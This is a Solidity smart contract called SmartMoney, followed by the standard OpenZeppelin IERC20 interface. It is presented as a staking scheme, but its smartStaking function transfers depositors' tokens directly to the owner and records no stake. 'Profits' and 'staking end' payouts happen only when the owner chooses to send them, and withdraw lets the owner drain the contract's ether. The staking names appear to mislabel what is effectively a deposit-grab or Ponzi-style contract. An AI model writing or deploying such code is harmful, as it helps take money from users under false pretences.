// SPDX-License-Identifier: no license
pragma solidity ^0.8.6;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SmartMoney{
    IERC20 public _token = IERC20(0x6870c652649a116C13e3a10D73bacd63302829d6);
    // address public owner = 0xD8c6cB397fd00C7ccC6d5d8f5E046522C32fcFAE;
    address public owner;

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function smartStaking(uint256 _value) public returns (bool){
        return _token.transferFrom(msg.sender, owner, _value);
    }

    function dailyProfit(address[] memory recipients, uint256[] memory amounts) public onlyOwner{
        require(recipients.length > 0);
        require(recipients.length == amounts.length);
        
        address from = msg.sender;
                
        for (uint256 i = 0; i < recipients.length; i++) {
            uint256 amount = amounts[i];
            require(amount > 0);
            _token.transferFrom(from, recipients[i], amount);
        }
    }

    function stakingEnds(address[] memory recipients, uint256[] memory amounts) public onlyOwner{
        require(recipients.length > 0);
        require(recipients.length == amounts.length);
        
        address from = msg.sender;
                
        for (uint256 i = 0; i < recipients.length; i++) {
            uint256 amount = amounts[i];
            require(amount > 0);
            _token.transferFrom(from, recipients[i], amount);
        }
    }

    function withdraw() public onlyOwner{
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}